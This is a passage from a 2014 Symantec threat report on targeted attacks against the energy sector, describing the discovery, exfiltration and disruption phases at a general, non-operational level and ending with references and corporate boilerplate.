of a specifically designed piece malware, such as in the case of Stuxnet. Depending on the protection measures
implemented by the target, the attackers may also digitally sign their malware creation. In the past there have been
quite a few cases where code signing certificates were stolen and later misused to sign malware in order to pass it
unnoticed to high value targets.
Discovery phase
Once the attacker has a foothold on one system, the next step is to create a plan for lateral movement through the
network until the interesting data is found. With more specialized teams of attackers, we can often observe that the
infected system is first analyzed to ensure that it is of interest to them. With watering hole attacks especially, it can
happen that computers that were not targeted get infected. Infected computers need to be assessed by the attacker
and, if necessary, removed to keep the profile, and with that the chances of exposure, low.
One of the obvious tasks performed by attackers is to install key loggers, dump local credentials, search local
storage for saved accounts and sniff the network for passwords. Any account detail can be useful to them. Domain
administrator passwords are of especially high value, as they can help greatly in moving further through the Intranet.
Often small scripts or even manual commands are used to comb through local files and create network mappings.
Simple system commands can help the attacker to learn about installed security tools, saved links to internal
                                                     Page 26
                                                                       Targeted Attacks Against the Energy Sector
platforms and local address books.
Once new systems are identified the
attacker will attempt to hop onto
them as well. In some instances
they might even use zero-day
vulnerabilities to spread further into
the network.
One method which is gaining more
relevance is the hijacking of local
software distribution systems for
further distribution. This can either
be proprietary systems, such as the
case of Trojan.Jokra in South Korea,
or OS-specific, such as hijacking
Windows Update, in the case of
Flamer. Once the attackers have
successfully managed to create
and distribute their own package,       Figure 9: Typical commands used during discovery phase
they can easily infect all connected
systems at once. Especially in cases
of wiping attacks, such Trojan.Jokra, this is a very efficient way to disrupt as many computers as possible.
If the target is assumed to be in a separated network not connected to the Internet, the malware used might try and
autonomously infect removable drives, like USB sticks, or project files for PLCs. This could allow the malware to be
manually introduced to the destination network, without the knowledge of the carrier, essentially jumping air gaps
into isolated networks.
At the end of the discovery phase the attackers should know the internals of the infected networks and have
identified systems with interesting data or with connected industrial control systems.
Capture/exfiltration phase
The capture and exfiltration phases are not always present. If the sole goal of the attackers is to cause a disruption
they may directly jump to a destructive payload. However, in most cases information is extracted first, which in turn
allows the sabotage to be constructed more efficiently at a later phase.
In this phase the interesting data is gathered and sent back to the attackers. This can be done with different levels of
sophistication. The simple attacks compress the files and upload them through FTP or through a HTTP POST request
to a remote drop server. More sophisticated attackers obfuscate the data by XOR-ing it, encrypting it with proper
asymmetric encryption or embedding it into media files using steganography to hide the data from traffic inspection.
In addition to this, the amount of data sent and the timing can be chosen in a smart way. For example, some malware
samples will send the data in smaller bursts so as not to swamp the network or generate network spikes that might
attract attention. Since most employees use laptops, the malware can use location awareness to detect if the
compromised computer is outside of the corporate network and send the data once it
s directly connected to the
Internet, such as from a Wi-Fi hotspot at an airport. This might allow the traffic to bypass perimeter security and
receive less scrutiny. In some instances the infected computer might not have a direct connection to the Internet. In
such cases, a previously compromised computer in the DMZ can act as a proxy, forwarding all the collected data.
Disruption phase
This is when any destructive payload is launched. If the attackers are only after information this phase might not
happen at all. The targets and the goals for disruption attacks can be very different, there is no such thing as one-
size-fits-all for disruption attacks. For example, Stuxnet was tailored to attack a specific uranium enrichment facility
and would not work against a different target.
In recent times, wiper Trojans have been popular in attacks against the energy sector. The malware deletes all files
                                                    Page 27
                                                                        Targeted Attacks Against the Energy Sector
   on a computer and then deletes the master boot record, rendering the computer unusable. This can happen on
   any operating systems and we have seen scripts for different UNIX flavors being used as well. Depending on
   the disaster recovery plan in place, these computers can be remotely recovered. However, there may still be an
   outage while the computers are being restored.
Resources
   [1] Marco Cova, Corrado Leita, Olivier Thonnard, Angelos D. Keromytis, and Marc Dacier. An analysis of rogue
   AV campaigns. In Proc. of the 13th International Conference on Recent Advances in Intrusion Detection
   (RAID), 2010.
   [2] O.Thonnard, M.Dacier. A Strategic Analysis of Spam Botnets Operations. CEAS
11, Perth, WA, Australia,
   Sep 2011.
   [3]
Jelena Isacenkova, Olivier Thonnard, Andrei Costin, Davide Balzarotti, Aurelien Francillon.
Inside the SCAM
   Jungle: A Closer Look at 419 Scam Email Operations.
International Workshop on Cyber Crime (IWCC 2013),
   IEEE S&P Workshops, 2013.
   [4]
Olivier Thonnard, Leyla Bilge, Gavin O
Gorman, Se
n Kiernan, Martin Lee.
Industrial Espionage and
   Targeted Attacks: Understanding the Characteristics of an Escalating Threat. In Proc. Of the 15th
   International conference on
Research in Attacks, Intrusions, and Defenses (RAID), 2012.
   [5] Symantec Internet Security Threat Report (ISTR), Volume 17, April 2012.
                                                      Page 28
Author
Candid Wueest
Principal Software Engineer
                                                                                                                               About Symantec
                                                                                        Symantec protects the world
s information and is the
                                                                                  global leader in security, backup, and availability solutions.
                                                                                     Our innovative products and services protect people and
                                                                                  information in any environment
from the smallest mobile
                                                                                 device to the enterprise data center to cloud-based systems.
                                                                                             Our industry-leading expertise in protecting data,
                                                                                   identities, and interactions gives our customers confidence
                                                                                        in a connected world. More information is available at
                                                                                       www.symantec.com or by connecting with Symantec at
                                                                                                                 go.symantec.com/socialmedia.
       Follow us on Twitter                                                                           Headquartered in Mountain View, Calif.,
       @threatintel                                                                                  Symantec has operations in 40 countries.
                                                                                          More information is available at www.symantec.com.
       Visit our Blog
       http://www.symantec.com/connect/symantec-blogs/sr
                                    For specific country offices and contact numbers, please visit our website.
Symantec World Headquarters                                                                                  Copyright 
 2014 Symantec Corporation. All
350 Ellis St.                                                                                                rights reserved. Symantec, the Symantec Logo,
                                                                                                             and the Checkmark Logo are trademarks or
Mountain View, CA 94043 USA                                                                                  registered trademarks of Symantec Corporation
+1 (650) 527-8000                                                                                             or its affiliates in the U.S. and other countries.
1 (800) 721-3934                                                                                             Other names may be trademarks of their
www.symantec.com                                                                                                                             respective owners.
Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec
Corporation.
NO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use
of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or
typographical errors. Symantec reserves the right to make changes without prior notice.
